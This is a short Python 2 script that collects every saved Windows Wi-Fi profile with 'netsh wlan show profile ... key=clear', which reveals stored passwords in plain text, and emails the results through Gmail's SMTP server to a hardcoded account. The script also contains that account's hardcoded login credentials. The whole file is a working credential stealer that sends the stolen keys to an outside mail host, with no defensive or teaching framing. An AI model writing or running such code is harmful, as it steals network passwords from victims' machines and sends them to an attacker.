#!/usr/bin/env python2
import re
import subprocess
import smtplib


def send_mail(sender_email, sender_password, message, receiver_email="self"):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Creates SMTP server instance :)
    # Google allows users to use their server which runs on port 587 :)

    server.starttls()  # Initiates TLS connection to the server :)

    server.login(sender_email, sender_password)  # Login in with the email and pass on the Server :)

    server.sendmail(from_addr=sender_email, to_addrs=receiver_email if receiver_email is "self" else sender_email,
                    msg=message)  # Sends A Mail containing this.message :)

    server.quit()  # Quits Server :)


output = subprocess.check_output("netsh wlan show profile", shell=True)

wlan_ssid_list = re.findall(r"(?:Profile\s*:\s*)(.*)", output)

result = ""

for wlan_ssid in wlan_ssid_list:
    command = "netsh wlan show profile " + str(wlan_ssid) + " key=clear"
    output = subprocess.check_output(command, shell=True)
    result += str(output)

send_mail("loveaash3@gmail.com", "root@kali", result)
